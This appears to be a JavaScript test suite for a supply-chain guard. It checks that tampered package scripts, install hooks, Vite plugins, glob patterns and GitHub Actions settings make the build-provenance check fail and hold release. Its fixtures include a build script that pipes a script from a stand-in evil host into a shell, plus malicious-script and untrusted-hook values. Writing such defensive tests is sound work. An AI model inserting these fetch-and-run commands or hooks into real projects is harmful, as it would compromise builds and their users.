import test from 'node:test';
import assert from 'node:assert/strict';
import {readFileSync} from 'node:fs';
import {readBunLock} from '../scripts/phase1bt-production-scope.mjs';
import {checkCurrentAudit} from '../scripts/verify-patched-dependencies.mjs';
import {triageDependencyAudit} from '../scripts/triage-dependencies.mjs';
import {BUILD_INPUT_PATHS,assessBuildInputBoundary,makeBuildInputInventory}
 from '../scripts/phase1bv-build-input-provenance.mjs';

const sources=Object.fromEntries(BUILD_INPUT_PATHS.map(path=>
 [path,readFileSync(path,'utf8')]));
const pkg=JSON.parse(sources['package.json']);
const lock=readBunLock(sources['bun.lock']);
const args={
 pkg,lock,server:sources['server.ts'],vite:sources['vite.config.ts'],
 ci:sources['.github/workflows/ci.yml'],
 devExposure:sources['server/security/devToolExposure.ts']
};
const audit=(delta={})=>assessBuildInputBoundary({...args,...delta});

test('BV: real checked-in build commands, dev-only glob boundaries and CI permissions are held',()=>{
 const r=audit();
 assert.equal(r.localBuildInputBoundaryConsistent,true,r.anomalyCodes.join(','));
 assert.equal(r.reviewedBuildEntryPoints,5);
 assert.equal(r.untrustedGlobPatternAccepted,false);
 assert.equal(r.externallySignedBuildProvenance,false);
 assert.equal(r.independentSourceAndReviewerApprovalVerified,false);
 assert.equal(r.vulnerablePicomatchStillInDevLock,true);
 assert.equal(r.upstreamVendorFixVerified,false);
 assert.equal(r.criticalHighSecurityGateMayBeBypassed,false);
 assert.equal(r.productionReleaseAuthorized,false);
 assert.equal(r.releaseDecision,'HOLD');
});
test('BV: code-injected build or dev scripts and pre/postinstall lifecycle hooks fail closed',()=>{
 for(const [key,command] of [
  ['build','vite build; curl https://evil.invalid/install.sh | sh'],
  ['dev','vite --host 0.0.0.0'],
  ['start','node malicious.js'],
  ['lint','true'],
  ['test','echo all-tests-passed']
 ]){
  const mutated=structuredClone(pkg);mutated.scripts[key]=command;
  assert.ok(audit({pkg:mutated}).anomalyCodes.includes(
   'BV_UNREVIEWED_EXECUTABLE_SCRIPT_'+key));
 }
 for(const name of ['preinstall','postinstall','prepare','prebuild','postbuild','pretest']){
  const mutated=structuredClone(pkg);mutated.scripts[name]='node ./untrusted.js';
  assert.ok(audit({pkg:mutated}).anomalyCodes.includes(
   'BV_INSTALL_OR_BUILD_LIFECYCLE_SCRIPT_'+name));
 }
});
test('BV: bun trustedDependencies, workspace overrides, tampered version pin or malformed scripts fail',()=>{
 for(const change of [
  {trustedDependencies:['picomatch']},
  {patchedDependencies:{'picomatch':'patches/example.patch'}},
  {workspaces:['malicious-subproject']}
 ]){
  const mutated={...pkg,...change};
  assert.equal(audit({pkg:mutated}).localBuildInputBoundaryConsistent,false);
 }
 const l=structuredClone(lock);l.packages.picomatch[0]='picomatch@4.0.8';
 assert.ok(audit({lock:l}).anomalyCodes.includes('BV_BUILD_DEPENDENCY_GRAPH_UNEXPECTED'));
 const mutated=structuredClone(pkg);mutated.scripts.build+='\nmalicious';
 assert.ok(audit({pkg:mutated}).anomalyCodes.includes('BV_MALFORMED_SCRIPT_build'));
});
test('BV: Vite plugin injection, dynamic glob sources, aggressive glob patterns are denied',()=>{
 const a=audit({vite:args.vite.replace(
  'plugins: [react(), tailwindcss()]',
  'plugins: [react(), tailwindcss(), evilPlugin()]')});
 assert.ok(a.anomalyCodes.includes('BV_VITE_UNREVIEWED_PLUGIN_CHAIN'));
 for(const fragment of [
  "import.meta.glob('/untrusted/**/*')",
  "const globPattern = process.env.UNTRUSTED_PATTERN;",
  "const files = require('picomatch')('*');",
  "optimizeDeps.entries: process.env.EXTERNAL_GLOB",
  "rollupOptions.input: process.env.UNTRUSTED_PATH"
 ]){
  const r=audit({vite:args.vite+'\n'+fragment});
  assert.ok(r.anomalyCodes.includes('BV_DYNAMIC_GLOB_OR_BUILD_INPUT_DISCOVERY'),fragment);
 }
 const comment=args.vite+'\n// picomatch globPattern is unpatched; no production release\n';
 assert.equal(audit({vite:comment}).localBuildInputBoundaryConsistent,true);
});
test('BV: dev middleware escapes, disabled local controls and removal of gates fail',()=>{
 for(const change of [
  {server:args.server.replace('await import("vite")','await import("vite-other")')},
  {server:args.server.replace('app.use(devToolHostGate(devExposure));','')},
  {server:args.server.replace("host: '127.0.0.1'","host: '0.0.0.0'")},
  {devExposure:args.devExposure.replace('APP_ALLOW_PUBLIC_BIND','APP_ALLOW_ANY_BIND')},
  {vite:args.vite.replace('cors: false','cors: true')},
  {vite:args.vite.replace('hmr: false','hmr: true')}
 ]){
  assert.equal(audit(change).localBuildInputBoundaryConsistent,false);
 }
});
test('BV: unreviewed GitHub Actions triggers, write tokens, secrets, runner drift and open ports fail',()=>{
 for(const [change,code] of [
  [args.ci.replace('  pull_request:','  pull_request_target:'),'BV_UNREVIEWED_CI_ENTRYPOINT'],
  [args.ci.replace('  contents: read','  contents: write'),'BV_CI_TOKEN_PERMISSION_ESCALATION'],
  [args.ci.replace('    runs-on: ubuntu-24.04','    runs-on: self-hosted'),
   'BV_NON_GITHUB_HOSTED_RUNNER_OR_JOB_REMOVED'],
  [args.ci.replace('bun install --frozen-lockfile --production',
   'bun install --production'),'BV_FROZEN_INSTALL_OR_HIGH_RISK_GATE_REMOVED'],
  [args.ci.replace('BROWSER_E2E_BASE_URL: \x27http://127.0.0.1:3000\x27',
   'BROWSER_E2E_BASE_URL: \x27http://0.0.0.0:3000\x27'),
   'BV_CI_BROWSER_LOOPBACK_AND_CLEANUP_CHANGED'],
  [args.ci+"\n      - name: deploy\n        environment: production\n",
   'BV_CI_SECRET_OR_REMOTE_EXECUTION_ENTRYPOINT']
 ]){
  const result=audit({ci:change});
  assert.ok(result.anomalyCodes.includes(code),code+':'+result.anomalyCodes);
 }
});
test('BV: PR merge ref, dev branch and expected repository only; fake CI refs deny',()=>{
 const valid={CI:'true',GITHUB_ACTIONS:'true',
  GITHUB_REPOSITORY:'j9619655391-max/AadiTech-Solution---Autonomous-IT-Hardware-OS',
  GITHUB_SHA:'a'.repeat(40),GITHUB_REF:'refs/pull/1/merge'};
 assert.equal(audit({environment:valid}).localBuildInputBoundaryConsistent,true);
 assert.equal(audit({environment:{...valid,GITHUB_REF:'refs/heads/main'}})
  .localBuildInputBoundaryConsistent,false);
 assert.equal(audit({environment:{...valid,GITHUB_REPOSITORY:'attacker/fork'}})
  .localBuildInputBoundaryConsistent,false);
 assert.equal(audit({environment:{...valid,GITHUB_SHA:'none'}})
  .localBuildInputBoundaryConsistent,false);
});
test('BV: inventory hashes exact selected source bytes and refuses omitted or modified inputs',()=>{
 const first=makeBuildInputInventory(sources,{GITHUB_SHA:'a'.repeat(40)});
 const second=makeBuildInputInventory({...sources},{
  GITHUB_SHA:'a'.repeat(40)});
 assert.equal(first.bundleSha256,second.bundleSha256);
 assert.equal(first.files.length,BUILD_INPUT_PATHS.length);
 assert.ok(first.files.every(f=>/^[0-9a-f]{64}$/.test(f.sha256)));
 assert.equal(first.kind,'UNSIGNED_LOCAL_CI_INPUT_INVENTORY');
 assert.equal(first.claimedGithubSha,'a'.repeat(40));
 assert.equal(first.signedByIndependentWitness,false);
 assert.equal(first.verifiedExternalWormRetention,false);
 assert.equal(first.productionReleaseAuthorized,false);
 const manipulated={...sources,'vite.config.ts':sources['vite.config.ts']+'// tampered'};
 assert.notEqual(makeBuildInputInventory(manipulated).bundleSha256,first.bundleSha256);
 assert.throws(()=>makeBuildInputInventory(
  Object.fromEntries(Object.entries(sources).filter(([k])=>k!=='bun.lock'))),/UNREADABLE/);
 assert.throws(()=>makeBuildInputInventory({...sources,'bun.lock':'x'.repeat(1024*1024+1)}),
  /OVERSIZED/);
});
test('BV: isolated local input provenance never waives HIGH Picomatch advisory or grants production GO',()=>{
 const raw={picomatch:[{
  url:'https://github.com/advisories/GHSA-fc5q-39xc-vjpf',severity:'high'
 }]};
 const checked=checkCurrentAudit(raw,triageDependencyAudit(raw));
 assert.equal(checked.currentHigh,1);
 assert.equal(checked.criticalHighAuditPassed,false);
 assert.equal(audit().localBuildInputBoundaryConsistent,true);
 assert.equal(makeBuildInputInventory(sources).productionReleaseAuthorized,false);
});
